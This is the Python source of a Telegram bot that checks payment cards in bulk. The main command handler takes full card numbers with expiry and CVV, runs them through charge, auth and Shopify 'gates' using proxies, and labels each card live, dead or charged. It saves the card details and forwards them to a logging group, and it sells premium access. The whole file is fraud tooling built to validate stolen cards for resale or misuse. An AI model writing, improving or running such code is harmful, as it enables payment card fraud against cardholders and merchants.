import os
import time
from utils import Utils
from database import get_user, add_user, update_user_credits, update_user_last_command_time, is_group_authorized, update_daily_credits, get_daily_user_credits, save_card, get_user_stats
from telebot.types import Message, Document
from .bin_command import fetch_bin_info, format_bin_info
from utils_fo.logger import Logger
import aiohttp
from database import get_user_proxies, get_user_shopify_sites
import random
import re
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime  # Fix the datetime import


TOKEN = 'Bot Token'
LOGS = '-1002425307714' #Group ID for Logs


FREE_USER_LIMIT = int(os.getenv('FREE_USER_LIMIT', '50'))
PREMIUM_USER_LIMIT = int(os.getenv('PREMIUM_USER_LIMIT', '15'))

async def sendWebhook(message, res, card_details=None):
    try:
        # Add user details and card check statistics
        user_id = message.from_user.id
        user_stats = f"\n\nUser Info:"
        user_stats += f"\nID: {user_id}"
        user_stats += f"\nName: {message.from_user.first_name}"
        user_stats += f"\nUsername: @{message.from_user.username}" if message.from_user.username else "\nUsername: None"

        # add card check history n also about his current card check how many times he checked same card
        if card_details:
            info = get_user_stats(user_id, card=card_details[0])
        else:
            info = get_user_stats(user_id)
        user_stats += f"\n\nCard Check History:"
        user_stats += f"\nTotal Cards Checked: {info['total_checks']}"
        if card_details:
            user_stats += f"\nCurrent Card Check Count: {info['current']}"
            user_stats += f"\nOthers Checked Same Card: {info['other']}"
        
        res += user_stats
        webhook_url = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={LOGS}'
        async with aiohttp.ClientSession() as session:
            await session.post(webhook_url, json={
                'text': res,
                'parse_mode': 'HTML'
            })
    except Exception as e:
        print(f"Error sending webhook: {str(e)}")

class CommandType:
    AUTH = "Auth"
    CHARGE = "Charge"
    CCN = "CCN"
    LOOKUP = "Lookup"
    MASS = "Mass"

def is_valid_user(message: Message) -> bool:
    if message.chat.type not in ['private', 'group', 'supergroup'] or message.from_user.is_bot:
        return False
    return True

class BaseCommand:
    _commands = {}
    def __init__(self, bot, name, cmd, handler, cmd_type, amount=0.00, amountType = '$',deduct_credits=0, premium=True, status=True):
        self.bot = bot
        self.name = name
        self.cmd = cmd
        self.handler = handler
        self.cmd_type = cmd_type
        self.amount = int(amount) if isinstance(amount, int) else amount
        self.deduct_credits = deduct_credits
        self.amountType = amountType
        self.premium = premium
        self.status = status
        self.logger = Logger.get_logger()
        self.gate = None
        if self.cmd_type == CommandType.CHARGE:
            self.gate = f'{self.name.upper()}_CH'
        elif self.cmd_type == CommandType.CCN:
            self.gate = f'{self.name.upper()}_CCN'
        elif self.cmd_type == CommandType.AUTH:
            self.gate = self.name.upper()
        elif self.cmd_type == CommandType.MASS:
            self.gate = f'{self.name.upper()}_MASS'

    def register_command(self):
        BaseCommand._commands[self.cmd] = {
            'name': self.name,
            'type': self.cmd_type,
            'amount': self.amount,
            'amountType': self.amountType,
            'status': self.status,
            'premium': self.premium,
            'handler': self.handler
        }

        @self.bot.message_handler(commands=[self.cmd])
        async def command_handler(message):
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("👤 Buy", url="https://t.me/SajagOG" ),
                InlineKeyboardButton("💬 Official Group", url="https://t.me/+IreuwCegIxs3MzM9")
            )

            try:
                if not is_valid_user(message):
                    await self.bot.reply_to(message, "<b>Invalid user or chat type.</b>", reply_markup=markup)
                    return
                
                user_id = message.from_user.id
                user = get_user(user_id)
                if not user:
                    user = add_user(user_id)

                    if not user:
                        await self.bot.reply_to(message, "Failed to register user.")
                        return
                    else:
                        user = get_user(user_id)
                
                is_valid, error_msg, card_details = Utils.extract_and_validate_card(message)
                if not is_valid:
                    if 'Invalid format' in error_msg:
                        error_msg = f"<b>{self.gate.upper()} {' ' + str(self.amount) + self.amountType if isinstance(self.amount, float) and self.amount> 0 else ''}\nFormat: </b><code>/{self.cmd} cc|mm|yy|cvv</code>"
                        await self.bot.reply_to(message, error_msg)
                    return
                
                if user.is_admin or user_id == 7600267382:
                    time_limit = 0
                elif user.is_premium:
                    time_limit = PREMIUM_USER_LIMIT
                else:
                    time_limit = FREE_USER_LIMIT
                    daily = get_daily_user_credits(user_id)
                    if self.cmd != 'sh' and daily <= 0:
                        await self.bot.reply_to(message, f"<b>⚠️ Daily Credits Exhausted!\n- Check /credits for your balance\n- Upgrade to Premium via /plans!</b>")
                        return
                
                user_link = f'<a href="tg://user?id={user_id}">{message.from_user.first_name}</a>'
                user_type = "Owner" if user.is_admin else "Premium User" if user.is_premium else "Free User"

                if BaseCommand._commands[self.cmd]['status'] == False:
                    await self.bot.reply_to(message, f"<b>❌ {self.name.upper()} {self.cmd_type.upper()} - (/{self.cmd}) is currently disabled.\n-Try other /cmds</b>")
                    return
                
                if self.premium and not user.is_premium:
                    await self.bot.reply_to(message, "<b>This command is only available to premium users.\nHit /plans for more info!.</b>")
                    return
                
                # Add Shopify-specific checks
                if self.cmd == 'sh':
                    user_site = get_user_shopify_sites(user_id)
                    user_proxy = get_user_proxies(user_id)

                    if not user_site:
                        await self.bot.reply_to(message, "<b>❌ No Shopify site set!\nUse /shopify for more info.</b>")
                        return
                    else:
                        if 'api' in message.text.lower():
                            # extract the number after the api1 or api2 etc
                            apiId = re.search(r'api\d+', message.text.lower())
                            if not apiId:
                                await self.bot.reply_to(message,f"<b>❌ Invalid Shopify API format!\nUse /shopify for more info.</b>")
                                return
                                
                            apiId = apiId.group(0)
                            site_num = int(apiId.replace('api', ''))
                            if len(list(user_site)) >= site_num:
                                user_site = user_site[site_num - 1]
                            else:
                                await self.bot.reply_to(message,f"<b>❌ No Shopify found with the api{site_num} set!\nUse /shopify for more info.</b>")
                                return
                    
                    if not user_proxy:
                        await self.bot.reply_to(message, "<b>❌ No proxy set!\nUse /shopify for more info.</b>")
                        return
                
                cc, mes, ano, cvv = card_details


                if self.cmd_type == CommandType.LOOKUP:
                    current_time = time.time()
                    if user.last_command_time and current_time - user.last_command_time < time_limit:
                        await self.bot.reply_to(message, f"<b>[ϟ] Antispam Wait {time_limit - (current_time - user.last_command_time):.0f} seconds</b>")
                        return
                    update_user_last_command_time(user_id, current_time)
                    response_msg = await self.bot.reply_to(message, "<b>Checking card...</b>")
                    res0 = await self.handler(cc, mes, ano, cvv)
                    success, result = res0

                    timeTaken = time.time() - current_time
                    res = f"<b>{self.name.upper()} VBV (/{self.cmd}) - {'NON VBV ✅' if success else '3D SECURE ❌'}</b>"
                    res += '\n━━━━━━━━━━━━━━━━━━'
                    res += f'\n<b>CC:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>'
                    res += f'\n<b>Result: {result}</b>'
                    res += f"\nTime: <b>{timeTaken:.2f} seconds</b>"
                    res += f"\nChecked by {user_link} <b>[{user_type}]</b>"
                    await self.bot.edit_message_text(
                        res,
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id
                    )
                    await sendWebhook(message, res)
                    return

                if self.cmd_type == CommandType.MASS:
                    current_time = time.time()
                    if user.last_command_time and current_time - user.last_command_time < time_limit:
                        await self.bot.reply_to(message, f"<b>[ϟ] Antispam Wait {time_limit - (current_time - user.last_command_time):.0f} seconds</b>")
                        return
                    
                    cards = Utils.extract_multiple_cards(message, self.cmd,limit=10)
                    if not cards:
                        error_msg = f"<b>{self.gate.upper()}\nFormat: </b><code>/{self.cmd} cc|mm|yy|cvv\nLimit: 10 Cards"
                        await self.bot.reply_to(message, error_msg)
                        return
                    
                    response_msg = await self.bot.reply_to(message, f"<b>Found {cards}\nInitializing mass check!</b>")
                    results = []
                    
                    for i, card in enumerate(cards, 1):
                        cc, mes, ano, cvv = card
                        start_time = time.time()

                        try:
                            await self.bot.edit_message_text(
                                f"<b>Checking ({i}/{len(cards)})</b>\n"
                                f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n\n"
                                f"Previous Results:\n" + "\n\n".join(results),
                                chat_id=message.chat.id,
                                message_id=response_msg.message_id,
                                parse_mode='HTML'
                            )
                        except Exception as e:
                            self.logger.error(f"Error updating message: {str(e)}")
                        
                        try:
                            if self.cmd == 'sh':
                                res0 = await self.handler(cc, mes, ano, cvv, user_site, user_proxy)
                            else:
                                if Utils.is_banned_bin(cc):
                                    result = f"{i}. ❌ <code>{cc}|{mes}|{ano}|{cvv}</code>\n   └ Banned BIN"
                                    results.append(result)
                                    continue
                                res0 = await self.handler(cc, mes, ano, cvv)

                            # Format result based on response type
                            time_taken = time.time() - start_time
                            if isinstance(res0, tuple):
                                if len(res0) == 5:
                                    success, msg, gateway, amount, currency = res0
                                    if success:
                                        status = "✅ [CHARGED]"
                                        result = f"Charged {amount} {currency} via {gateway}"

                                if len(res0) == 3:
                                    success, msg, gateway = res0
                                    if success:
                                        if 'Incorrect Zip' in msg:
                                            status = "✅ [CVV LIVE]"
                                            result = f"Incorrect Zip - Gateway: {gateway}"
                                        elif any(x in msg.lower() for x in ['insuff', 'invalid_cvc', 'incorrect_cvc']):
                                            status = "✅"
                                            result = f"{msg} - Gateway: {gateway}"
                                        else:
                                            status = "✅"
                                            result = f"{msg} - Gateway: {gateway}"
                                    elif "Error Processing" in msg:
                                        status  = "⚠️"
                                        result = f"Proxy or Site Issue! - Site: {gateway}"
                                    else:
                                        if '3D' in msg:
                                            status = "❌ [3DS]"
                                            result = f"3D Secured - Gateway: {gateway}"
                                        else:
                                            status = "❌"
                                            result = f"{msg} - Gateway: {gateway}"

                                else:
                                    success, result = res0
                                    status = "✅" if success else "❌"
                            else:
                                success = bool(res0)
                                result = str(res0)
                                status = "✅" if success else "❌"
                            
                            save_card(cc, mes, ano, cvv, user_id, self.gate, success, result)

                            # Format final message with emojis and better spacing
                            results.append(
                                f"{i}. {status} <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                                f"   └ {result}\n"
                                f"   ⌚ Time: {time_taken:.2f}s"
                            )

                        except Exception as e:
                            results.append(f"{i}. ⚠️ <code>{cc}|{mes}|{ano}|{cvv}</code>\n   └ Error: {str(e)}")

                    # Final results with counts
                    live_count = sum(1 for r in results if "✅" in r)
                    dead_count = sum(1 for r in results if "❌" in r)
                    error_count = sum(1 for r in results if "⚠️" in r)

                    final_res = (
                        f"<b>{self.gate} Check Complete</b>\n"
                        f"<b>Total:</b> {len(cards)} | ✅ {live_count} | ❌ {dead_count} | ⚠️ {error_count}\n"
                        f"━━━━━━━━━━━━━━━━━━\n\n"
                        + "\n\n".join(results)
                    )

                    try:
                        await self.bot.edit_message_text(
                            final_res,
                            chat_id=message.chat.id,
                            message_id=response_msg.message_id,
                            parse_mode='HTML'
                        )
                    except Exception as e:
                        self.logger.error(f"Error updating final message: {str(e)}")
                    return
                
                # Other gates!!
                if Utils.is_banned_bin(cc):
                    res = f"<b>❌ {cc[:6]} - Bin Banned</b>"
                    await self.bot.reply_to(message, res)
                    res += f"\nChecked by {user_link} <b>[{user_type}]</b>"
                    res += f"\n\n<b>CC:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>"
                    await sendWebhook(message, res, card_details=None)
                    return
                
                current_time = time.time()
                if user.last_command_time and current_time - user.last_command_time < time_limit:
                    await self.bot.reply_to(message, f"<b>[ϟ] Antispam Wait {time_limit - (current_time - user.last_command_time):.0f} seconds</b>")
                    return
                
                response_msg = await self.bot.reply_to(message, "<b>Checking card...</b>")
                bin_response = fetch_bin_info(cc[:6])
                bin_info = format_bin_info(bin_response, cc[:6]) if bin_response else None
                # bin_response = fetch_bin_info(cc[:6])
                if 'prepaid' in bin_response['Category'].lower():
                    res = f"<b>❌ {cc[:6]} - Prepaid bins are banned!\n{bin_info}</b>"
                    await self.bot.edit_message_text(
                        '<b>❌ Prepaid bins are banned!</b>',
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id
                    )
                    res += f"\nChecked by {user_link} <b>[{user_type}]</b>"
                    res += f"\n\n<b>CC:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>"
                    update_user_last_command_time(user_id, current_time)
                    await sendWebhook(message, res, card_details=None)
                    return

                update_user_last_command_time(user_id, current_time)
                try:
                    if self.cmd == 'sh':
                        res0 = await self.handler(cc, mes, ano, cvv, user_site, user_proxy)
                        if isinstance(res0, tuple):
                            if len(res0) == 5:
                                success, msg, gateway, amount, currency = res0
                                if success:
                                    status = "✅ [CHARGED]"
                                    result = f"Charged {amount} {currency} via {gateway}"
                            
                            if len(res0) == 3:
                                success, msg, gateway = res0
                                if success:
                                    if 'Incorrect Zip' in msg:
                                        status = "✅ [CVV LIVE]"
                                        result = f"Incorrect Zip - Gateway: {gateway}"
                                    elif any(x in msg.lower() for x in ['insuff', 'invalid_cvc', 'incorrect_cvc']):
                                        status = "✅"
                                        result = f"{msg} - Gateway: {gateway}"
                                    else:
                                        status = "✅"
                                        result = f"{msg} - Gateway: {gateway}"
                                elif "Error Processing" in msg:
                                    status  = "⚠️"
                                    result = f"Proxy or Site Issue! - Site: {gateway}"
                                else:
                                    if '3D' in msg:
                                        status = "❌ [3DS]"
                                        result = f"3D Secured - Gateway: {gateway}"
                                    else:
                                        status = "❌"
                                        result = f"{msg} - Gateway: {gateway}"

                            else:
                                success, result = res0
                                status = "✅" if success else "❌"
                        else:
                            success = bool(res0)
                            result = str(res0)
                            status = "✅" if success else "❌"
                    else:
                        res0 = await self.handler(cc, mes, ano, cvv)
                        if isinstance(res0, tuple):
                            if len(res0) == 2:
                                success, result = res0
                                price = self.amount
                            else:
                                success, result, price = res0
                        else:
                            success = bool(res0)
                            result = str(res0)
                            price = self.amount
                    timeTaken = time.time() - current_time
                    
                    if success and (self.cmd_type == CommandType.CHARGE or self.cmd_type == CommandType.CCN or self.cmd_type == CommandType.MASS) and ('charge' in result.lower() or 'success' in result.lower()):
                        result = f'Charged {price}{self.amountType}'
                    
                    save_card(cc, mes, ano, cvv, user_id, self.gate, success, result)
                    
                    res = f"<b>{self.gate} (/{self.cmd}) - {'LIVE ✅' if success else 'DEAD ❌'}</b>"
                    res += '\n━━━━━━━━━━━━━━━━━━'
                    res += f'\n<b>CC:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>'
                    res += f'\nResult: <b>{result.strip()}</b>' if result else "<b>None</b>"
                    res += f"\n{bin_info}" if bin_info else ""
                    res += f"\nTime: <b>{timeTaken:.2f} seconds</b>"
                    res += f"\nChecked by {user_link} <b>[{user_type}]</b>"

                    await self.bot.edit_message_text(
                        res,
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id
                    )

                    await sendWebhook(message, res)
                    if result == 'Retry - Proxy failed' or result == 'Retry - Unknown error' or result == 'Retry - Site Issue':
                        return
                    if self.premium == False and not (user.is_premium or user.is_admin):
                        update_daily_credits(user_id, -1)
                        self.logger.info(f"Free user deducted {self.deduct_credits} credits for {self.name} command")
                    
                    # elif self.deduct_credits > 0 and self.premium == True and user.is_premium == True:
                    #     update_user_credits(user_id, -self.deduct_credits)
                    #     self.logger.info(f"Premium user deducted {self.deduct_credits} credits for {self.name} command")

                except Exception as e:
                    self.logger.error(f"Error processing card: {str(e)}", exc_info=True)
                    await self.bot.edit_message_text(
                        f"❌ Error processing card: {str(e)}",
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id
                    )
                    
            except Exception as e:
                await self.bot.reply_to(message, f"Error: {str(e)}")
                self.logger.error(f"Error processing command: {str(e)}", exc_info=True)





        @self.bot.message_handler(content_types=['document'])
        async def handle_document(message):
            if not is_valid_user(message):
                # await self.bot.reply_to(message, "<b>Invalid user or chat type.</b>")
                return

            user_id = message.from_user.id
            user = get_user(user_id)
            if not user:
                user = add_user(user_id)
                if not user:
                    await self.bot.reply_to(message, "Failed to register user.")
                    return
                else:
                    user = get_user(user_id)

            if not user.is_admin:
                return
            
            file_info = await self.bot.get_file(message.document.file_id)
            file_path = file_info.file_path
            file = await self.bot.download_file(file_path)

            content = file.decode('utf-8')
            cards = re.findall(r'\b\d{12,19}\|[0-1][0-9]\|[2-9][0-9]\|[0-9]{3,4}\b', content)
            if not cards:
                await self.bot.reply_to(message, "<b>No valid cards found in the file.</b>")
                return
            original = len(cards)
            if len(cards) > 200:
                cards = cards[:200]

            await self.bot.reply_to(message, f"<b>Document received with {original} valid cards. \nWe will only process {len(cards)}\nReply with /check [command] to start checking.</b>")

        @self.bot.message_handler(commands=['check'], func=lambda message: message.reply_to_message and message.reply_to_message.document)
        async def handle_check_command(message):
            if not is_valid_user(message):
                return
            chat_id = message.chat.id
            user_id = message.from_user.id
            user = get_user(user_id)

            if not user:
                await self.bot.reply_to(message, "<b>Register urself</b>")
                return

            if len(message.text.split()) < 2:
                await self.bot.reply_to(message, "<b>Usage: /check [command]</b>")
                return
            
            command = message.text.split()[1].lower()
            if command not in BaseCommand._commands:
                await self.bot.reply_to(message, "<b>Invalid command specified.</b>")
                return
            
            if not user.is_premium:
                await self.bot.reply_to(message, "<b>Not Authorized.</b>")
                return
            
            
            handler = BaseCommand._commands[command]['handler']
            newGate = BaseCommand._commands[command]['name']

            file_info = await self.bot.get_file(message.reply_to_message.document.file_id)
            file_path = file_info.file_path

            file = await self.bot.download_file(file_path)

            content = file.decode('utf-8')
            
            cards = re.findall(r'\b\d{12,19}\|[0-1][0-9]\|[2-9][0-9]\|[0-9]{3,4}\b', content)
            
            if not cards:
                await self.bot.reply_to(message, "<b>No valid cards found in the file.</b>")
                return
            
            original = len(cards)
            if len(cards) > 200:
                cards = cards[:200]

            response_msg = await self.bot.reply_to(message, f"<b>Found {original} valid cards. \nWe will only process {len(cards)}\nInitializing check for /{command}!</b>")
            results = []
            self.cancel_check = False

            for i, card in enumerate(cards, 1):
                if self.cancel_check:
                    await self.bot.reply_to(message, "<b>Card checking process has been canceled.</b>")
                    break

                cc, mes, ano, cvv = card.split('|')
                start_time = time.time()

                try:
                    last_results = "\n\n".join(results[-10:])
                    await self.bot.edit_message_text(
                        f"<b>Checking ({i}/{len(cards)})</b>\n"
                        f"<code>{cc}|{mes}|{ano}|{cvv}</code>\n\n"
                        f"Previous Results:\n" + last_results,
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id,
                        parse_mode='HTML'
                    )
                except Exception as e:
                    self.logger.error(f"Error updating message: {str(e)}")

                try:
                    if command == 'sh':
                        user_site = get_user_shopify_sites(user_id)
                        user_proxy = get_user_proxies(user_id)

                        if not user_site:
                            await self.bot.reply_to(message, "<b>❌ No Shopify site set!\nUse /shopify for more info.</b>")
                            return
                        else:
                            if 'api' in message.text.lower():
                                apiId = re.search(r'api\d+', message.text.lower())
                                if not apiId:
                                    await self.bot.reply_to(message, f"<b>❌ Invalid Shopify API format!\nUse /shopify for more info.</b>")
                                    return

                                apiId = apiId.group(0)
                                site_num = int(apiId.replace('api', ''))
                                if len(list(user_site)) >= site_num:
                                    user_site = user_site[site_num - 1]
                                else:
                                    await self.bot.reply_to(message, f"<b>❌ No Shopify found with the api{site_num} set!\nUse /shopify for more info.</b>")
                                    return
                        
                        if not user_proxy:
                            await self.bot.reply_to(message, "<b>❌ No proxy set!\nUse /shopify for more info.</b>")
                            return
                        
                        res0 = await handler(cc, mes, ano, cvv, user_site, user_proxy)
                        if isinstance(res0, tuple):
                            if len(res0) == 5:
                                success, msg, gateway, amount, currency = res0
                                if success:
                                    status = "✅ [CHARGED]"
                                    result = f"Charged {amount} {currency} via {gateway}"

                            if len(res0) == 3:
                                success, msg, gateway = res0
                                if success:
                                    if 'Incorrect Zip' in msg:
                                        status = "✅ [CVV LIVE]"
                                        result = f"Incorrect Zip - Gateway: {gateway}"
                                    elif any(x in msg.lower() for x in ['insuff', 'invalid_cvc', 'incorrect_cvc']):
                                        status = "✅"
                                        result = f"{msg} - Gateway: {gateway}"
                                    else:
                                        status = "✅"
                                        result = f"{msg} - Gateway: {gateway}"
                                elif "Error Processing" in msg:
                                    status  = "⚠️"
                                    result = f"Proxy or Site Issue! - Site: {gateway}"
                                else:
                                    if '3D' in msg:
                                        status = "❌ [3DS]"
                                        result = f"3D Secured - Gateway: {gateway}"
                                    else:
                                        status = "❌"
                                        result = f"{msg} - Gateway: {gateway}"

                            else:
                                success, result = res0
                                status = "✅" if success else "❌"
                    else:
                        if user.is_admin:
                            res0 = await handler(cc, mes, ano, cvv)
                            success, result = res0 if isinstance(res0, tuple) else (bool(res0), str(res0))
                            status = "✅" if success else "❌"
                        else:
                            return

                    time_taken = time.time() - start_time

                    save_card(cc, mes, ano, cvv, user_id, newGate, success, result)

                    results.append(
                        f"{i}. {status} <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
                        f"   └ {result}\n"
                        f"   ⌚ Time: {time_taken:.2f}s"
                    )
                except Exception as e:
                    results.append(f"{i}. ⚠️ <code>{cc}|{mes}|{ano}|{cvv}</code>\n   └ Error: {str(e)}")

            if not self.cancel_check:
                live_count = sum(1 for r in results if "✅" in r)
                dead_count = sum(1 for r in results if "❌" in r)
                error_count = sum(1 for r in results if "⚠️" in r)

                final_res = (
                    f"<b>{self.gate} Check Complete</b>\n"
                    f"<b>Total:</b> {len(cards)} | ✅ {live_count} | ❌ {dead_count} | ⚠️ {error_count}\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    + "\n\n".join(results)
                )

                try:
                    await self.bot.edit_message_text(
                        final_res,
                        chat_id=message.chat.id,
                        message_id=response_msg.message_id,
                        parse_mode='HTML'
                    )
                except Exception as e:
                    self.logger.error(f"Error updating final message: {str(e)}")
                
                # Send the document back to the admin or owner
                filename = f"checked_cards_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(results))
                
                with open(filename, 'rb') as f:
                    await self.bot.send_document(message.chat.id, f, caption="📋 Checked Cards Results")

                os.remove(filename)

        @self.bot.message_handler(commands=['cancel'])
        async def handle_cancel_command(message):
            if not is_valid_user(message):
                return

            user_id = message.from_user.id
            user = get_user(user_id)
            if not user or not user.is_admin:
                return

            self.cancel_check = True
            await self.bot.reply_to(message, "<b>Card checking process has been canceled.</b>")

    @staticmethod
    def get_commands_by_type():
        """Get all registered commands grouped by type"""
        grouped = {}
        for cmd, info in BaseCommand._commands.items():
            cmd_type = info['type']
            if cmd_type not in grouped:
                grouped[cmd_type] = []
            grouped[cmd_type].append({
                'cmd': cmd,
                'name': info['name'],
                'amount': info['amount'],
                'amountType': info['amountType'],
                'status': info['status'],
                'premium': info.get('premium', True)
            })
        return grouped

    @staticmethod
    def get_all_commands():
        """Get all registered commands as a list"""
        return [
            {
                'cmd': cmd,
                'name': info['name'],
                'amount': info['amount'],
                'amountType': info['amountType'],
                'status': info['status'],
                'type': info['type']
            }
            for cmd, info in BaseCommand._commands.items()
        ]